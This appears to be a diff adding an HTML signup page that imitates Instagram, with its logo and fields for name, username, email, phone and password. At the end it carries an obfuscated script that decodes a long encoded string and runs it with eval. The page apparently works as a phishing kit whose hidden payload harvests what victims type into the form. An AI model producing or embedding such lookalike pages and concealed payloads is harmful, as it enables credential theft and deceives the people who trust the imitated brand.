@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram-Style Signup</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    
+    .container {
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+      padding: 20px;
+      position: relative;
+    }
+    
+    .logo-container {
+      margin-bottom: 20px;
+    }
+    
+    .logo {
+      width: 90px;
+      height: auto;
+    }
+    
+    .signup-form {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+    }
+    
+    .signup-form input {
+      font-size: 14px;
+      padding: 12px;
+      margin: 5px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 5px;
+      outline: none;
+    }
+    
+    .signup-btn {
+      background-color: #0095f6;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      border: none;
+      border-radius: 5px;
+      padding: 12px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+    
+    .signup-btn:hover {
+      background-color: #0073d6;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Logo -->
+    <div class="logo-container">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Logo" class="logo"/>
+    </div>
+  
+    <!-- Signup form -->
+    <h2>Sign Up</h2>
+    <form class="signup-form">
+      <input type="text" placeholder="Full Name" required/>
+      <input type="text" placeholder="Username" required/>
+      <input type="email" placeholder="Email" required/>
+      <input type="tel" placeholder="Mobile number" required/>
+      <input type="password" placeholder="Password" required/>
+      <button type="submit" class="signup-btn">Sign Up</button>
+    </form>
+  </div>
+<script>var _0xc68e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe17c(d,e,f){var g=_0xc68e[2][_0xc68e[1]](_0xc68e[0]);var h=g[_0xc68e[3]](0,e);var i=g[_0xc68e[3]](0,f);var j=d[_0xc68e[1]](_0xc68e[0])[_0xc68e[10]]()[_0xc68e[9]](function(a,b,c){if(h[_0xc68e[4]](b)!==-1)return a+=h[_0xc68e[4]](b)*(Math[_0xc68e[8]](e,c))},0);var k=_0xc68e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc68e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe17c(s,e,10)-t)}return decodeURIComponent(escape(r))}("dHwZHMdZHLLZHLMZxYxZxYwZdHwZHYxZHHHZHxYZHwwZHxYZHHHZHdMZHYLZHHdZdHwZdLMZdHwZdHLZdMLZdwLZdLdZdwLZdMYZdMdZdMHZdMYZdMdZdLdZdLHZHYHZHYHZHddZHYLZdwxZxddZHxdZHwwZHxwZdwLZHMwZHwwZHxdZHMxZHHHZHHwZHLwZxdHZHMxZxYHZdMdZHYMZHxdZHHYZHYHZHwLZHxYZHLdZHwwZHHHZHdHZxYYZHxYZHYMZxYxZdHLZdLxZdHwZHMdZHLLZHLMZxYxZxYwZdHwZHYwZHdHZHYHZHxYZHwwZHdxZHYMZdHwZdLMZdHwZdHLZdMLZdwLZdMMZdMLZdwLZdMYZdMMZdMxZdMxZdLYZdHLZdLxZdHwZHMwZxYMZHLMZHMdZxYwZHLYZHLLZHLMZdHwZxYxZHMxZHLMZHMHZHxYZHLLZHxYZHMxZHLxZHMxZHMMZxYHZHwLZHLwZdxMZHLwZHMxZxYxZxYxZHwLZHMMZHMxZdxLZdHwZxdwZdHwZHMdZHLLZHLMZxYxZxYwZdHwZHwLZxYYZHLYZHxdZxYHZHLxZdHwZdLMZdHwZHwMZHMLZxYwZxYwZxYYZxYxZdLHZdwMZdwMZHwLZxYYZHLYZdwwZxYwZHMxZHLxZHMxZHMMZxYHZHwLZHLwZdwwZHLLZxYHZHMMZdwMZHMYZHLLZxYwZdxdZxdwZHYxZHHHZHxYZHwwZHxYZHHHZHdMZHYLZHHdZxdLZdwMZxYxZHMxZHLMZHMHZHHYZHMxZxYxZxYxZHwLZHMMZHMxZHwMZdLxZdHwZHMwZHMxZxYwZHMdZHMLZdxMZHwLZxYYZHLYZHxdZxYHZHLxZdwHZdHwZxdwZdHwZHLwZHMxZxYwZHMLZHLLZHMHZdLHZdHwZdHLZHHxZHHHZHHLZHxYZdHLZdwHZdHwZHMLZHMxZHwLZHMHZHMxZxYHZxYxZdLHZdHwZxdwZdHwZdHLZHYwZHLLZHLMZxYwZHMxZHLMZxYwZdwxZHxYZxdHZxYYZHMxZdHLZdLHZdHwZdHLZHwLZxYYZxYYZHLxZHLYZHMdZHwLZxYwZHLYZHLLZHLMZdwMZHLdZxYxZHLLZHLMZdHLZdHwZxdLZdwHZdHwZHMYZHLLZHMHZxdHZdLHZdHwZHdwZHHLZHHHZHHdZdwwZxYxZxYwZxYHZHLYZHLMZHMMZHLYZHMwZxdHZdxMZxdwZdHwZHMdZHMLZHwLZxYwZHwwZHLYZHMHZdLHZdHwZHYwZHdHZHYHZHxYZHwwZHdxZHYMZdwHZdHwZxYwZHMxZxddZxYwZdLHZdHwZHLwZHMxZxYxZxYxZHwLZHMMZHMxZdwHZdHwZxYYZHwLZxYHZxYxZHMxZHwwZHLwZHLLZHMHZHMxZdLHZdHwZdHLZHHYZHwLZxYHZHLHZHMHZHLLZxdYZHLMZdHLZdHwZxdLZdxLZdHwZxdLZdxLZdHwZdwwZxYwZHMLZHMxZHLMZdxMZxYHZHMxZxYxZxYYZHLLZHLMZxYxZHMxZdHwZdLMZdLLZdHwZxYHZHMxZxYxZxYYZHLLZHLMZxYxZHMxZdwwZHLdZxYxZHLLZHLMZdxMZdxLZdxLZdHwZdwwZxYwZHMLZHMxZHLMZdxMZHMHZHwLZxYwZHwLZdHwZdLMZdLLZdHwZxdwZdHwZHMdZHLLZHLMZxYxZHLLZHLxZHMxZdwwZHLxZHLLZHMMZdxMZdHLZHxYZHMxZHLxZHMxZHMMZxYHZHwLZHLwZdHwZxYHZHMxZxYxZxYYZHLLZHLMZxYxZHMxZdLHZdHLZdwHZdHwZHMHZHwLZxYwZHwLZdxLZdLxZdHwZxdYZHLYZHLMZHMHZHLLZxdYZdwwZHLxZHLLZHMdZHwLZxYwZHLYZHLLZHLMZdwwZHMLZxYHZHMxZHMwZdHwZdLMZdHwZdHLZdwMZHMwZxYHZHMxZHMxZdwwZHMLZxYwZHLwZHLxZdHLZdLxZdHwZxdLZdxLZdHwZdwwZHMdZHwLZxYwZHMdZHMLZdxMZHMxZxYHZxYHZHLLZxYHZdHwZdLMZdLLZdHwZxdwZdHwZHMdZHLLZHLMZxYxZHLLZHLxZHMxZdwwZHMxZxYHZxYHZHLLZxYHZdxMZdHLZHYLZxYHZxYHZHLLZxYHZdHwZxYxZHMxZHLMZHMHZHLYZHLMZHMMZdHwZxYwZHLLZdHwZHxYZHMxZHLxZHMxZHMMZxYHZHwLZHLwZdLHZdHLZdwHZdHwZHMxZxYHZxYHZHLLZxYHZdxLZdLxZdHwZHwLZHLxZHMxZxYHZxYwZdxMZdHLZHHLZHLYZHMMZHLMZxYMZxYYZdHwZHMwZHwLZHLYZHLxZHMxZHMHZdwwZdHwZHHxZHLxZHMxZHwLZxYxZHMxZdHwZxYwZxYHZxdHZdHwZHwLZHMMZHwLZHLYZHLMZdwwZdHLZdxLZdLxZdHwZxdLZdxLZdLxZdHwZxdLZdHwZHMHZHLLZHMdZxYMZHLwZHMxZHLMZxYwZdwwZxYdZxYMZHMxZxYHZxdHZHHLZHMxZHLxZHMxZHMdZxYwZHLLZxYHZdxMZdHLZdwwZxYxZHLYZHMMZHLMZxYMZxYYZdwxZHMwZHLLZxYHZHLwZdHLZdxLZdwwZHwLZHMHZHMHZHYLZxYLZHMxZHLMZxYwZHdLZHLYZxYxZxYwZHMxZHLMZHMxZxYHZdxMZdHLZxYxZxYMZHMYZHLwZHLYZxYwZdHLZdwHZdHwZHMwZxYMZHLMZHMdZxYwZHLYZHLLZHLMZdxMZHMxZxYLZHMxZHLMZxYwZdxLZdHwZxdwZdHwZHMxZxYLZHMxZHLMZxYwZdwwZxYYZxYHZHMxZxYLZHMxZHLMZxYwZHYMZHMxZHMwZHwLZxYMZHLxZxYwZdxMZdxLZdLxZdHwZHMdZHLLZHLMZxYxZxYwZdHwZHMwZxYMZHLxZHLxZHHdZHwLZHLwZHMxZdHwZdLMZdHwZxYwZHMLZHLYZxYxZdwwZxYdZxYMZHMxZxYHZxdHZHHLZHMxZHLxZHMxZHMdZxYwZHLLZxYHZdxMZdHLZHLYZHLMZxYYZxYMZxYwZHwYZxYYZHLxZHwLZHMdZHMxZHMLZHLLZHLxZHMHZHMxZxYHZdLMZdxwZHdYZxYMZHLxZHLxZdHwZHHdZHwLZHLwZHMxZdxwZHwHZdHLZdxLZdwwZxYLZHwLZHLxZxYMZHMxZdLxZdHwZHMdZHLLZHLMZxYxZxYwZdHwZxYMZxYxZHMxZxYHZHLMZHwLZHLwZHMxZdHwZdLMZdHwZxYwZHMLZHLYZxYxZdwwZxYdZxYMZHMxZxYHZxdHZHHLZHMxZHLxZHMxZHMdZxYwZHLLZxYHZdxMZdHLZHLYZHLMZxYYZxYMZxYwZHwYZxYYZHLxZHwLZHMdZHMxZHMLZHLLZHLxZHMHZHMxZxYHZdLMZdxwZHxdZxYxZHMxZxYHZHLMZHwLZHLwZHMxZdxwZHwHZdHLZdxLZdwwZxYLZHwLZHLxZxYMZHMxZdLxZdHwZHMdZHLLZHLMZxYxZxYwZdHwZHMxZHLwZHwLZHLYZHLxZdHwZdLMZdHwZxYwZHMLZHLYZxYxZdwwZxYdZxYMZHMxZxYHZxdHZHHLZHMxZHLxZHMxZHMdZxYwZHLLZxYHZdxMZdHLZHLYZHLMZxYYZxYMZxYwZHwYZxYwZxdHZxYYZHMxZdLMZdxwZHMxZHLwZHwLZHLYZHLxZdxwZHwHZdHLZdxLZdwwZxYLZHwLZHLxZxYMZHMxZdLxZdHwZHMdZHLLZHLMZxYxZxYwZdHwZHLwZHLLZHMYZHLYZHLxZHMxZdHwZdLMZdHwZxYwZHMLZHLYZxYxZdwwZxYdZxYMZHMxZxYHZxdHZHHLZHMxZHLxZHMxZHMdZxYwZHLLZxYHZdxMZdHLZHLYZHLMZxYYZxYMZxYwZHwYZxYwZxdHZxYYZHMxZdLMZdxwZxYwZHMxZHLxZdxwZHwHZdHLZdxLZdwwZxYLZHwLZHLxZxYMZHMxZdLxZdHwZHMdZHLLZHLMZxYxZxYwZdHwZxYYZHwLZxYxZxYxZxdYZHLLZxYHZHMHZdHwZdLMZdHwZxYwZHMLZHLYZxYxZdwwZxYdZxYMZHMxZxYHZxdHZHHLZHMxZHLxZHMxZHMdZxYwZHLLZxYHZdxMZdHLZHLYZHLMZxYYZxYMZxYwZHwYZxYwZxdHZxYYZHMxZdLMZdxwZxYYZHwLZxYxZxYxZxdYZHLLZxYHZHMHZdxwZHwHZdHLZdxLZdwwZxYLZHwLZHLxZxYMZHMxZdLxZdHwZHLYZHMwZdHwZdxMZdHMZdwMZHwxZHwdZHMHZxdwZdMYZdwLZxdLZdxdZdwMZdwwZxYwZHMxZxYxZxYwZdxMZHLwZHLLZHMYZHLYZHLxZHMxZdxLZdxLZdHwZxdwZdHwZHwLZHLxZHMxZxYHZxYwZdxMZdHLZHHxZHLxZHMxZHwLZxYxZHMxZdHwZHMxZHLMZxYwZHMxZxYHZdHwZHwLZdHwZxYLZHwLZHLxZHLYZHMHZdHwZdMYZdwLZdwxZHMHZHLYZHMMZHLYZxYwZdHwZHLwZHLLZHMYZHLYZHLxZHMxZdHwZHLMZxYMZHLwZHMYZHMxZxYHZdwwZdHLZdxLZdLxZdHwZxYHZHMxZxYwZxYMZxYHZHLMZdLxZdHwZxdLZdHwZHMdZHLLZHLMZxYxZxYwZdHwZHLwZHMxZxYxZxYxZHwLZHMMZHMxZdHwZdLMZdHwZHwMZMwHZxLMZxxdZxMHZdHwZdwYZHHdZHMxZxdYZdHwZHHLZHLYZHMMZHLMZxYMZxYYZdwYZHwdZHLMZMwHZxLMZxwMZwYxZdHwZHHdZHwLZHLwZHMxZdLHZdHwZdxdZxdwZHMwZxYMZHLxZHLxZHHdZHwLZHLwZHMxZxdLZHwdZHLMZMwHZxLMZxMdZxMwZdHwZHxdZxYxZHMxZxYHZHLMZHwLZHLwZHMxZdLHZdHwZdxdZxdwZxYMZxYxZHMxZxYHZHLMZHwLZHLwZHMxZxdLZHwdZHLMZMwHZxLMZxMYZwYLZdHwZHYLZHLwZHwLZHLYZHLxZdLHZdHwZdxdZxdwZHMxZHLwZHwLZHLYZHLxZxdLZHwdZHLMZMwHZxLMZxMYZwHHZdHwZHHYZHLLZHMYZHLYZHLxZHMxZdLHZdHwZdxdZxdwZHLwZHLLZHMYZHLYZHLxZHMxZxdLZHwdZHLMZMwHZxLMZxMdZxwMZdHwZHHxZHwLZxYxZxYxZxdYZHLLZxYHZHMHZdLHZdHwZdxdZxdwZxYYZHwLZxYxZxYxZxdYZHLLZxYHZHMHZxdLZHwMZdLxZdHwZxYxZHMxZHLMZHMHZHxYZHLLZHxYZHMxZHLxZHMxZHMMZxYHZHwLZHLwZdxMZHLwZHMxZxYxZxYxZHwLZHMMZHMxZdxLZdLxZdHwZxdLZdxLZdLxZ",38,"YdHxwMLZW",35,7,15))</script>
+</body>
+</html>
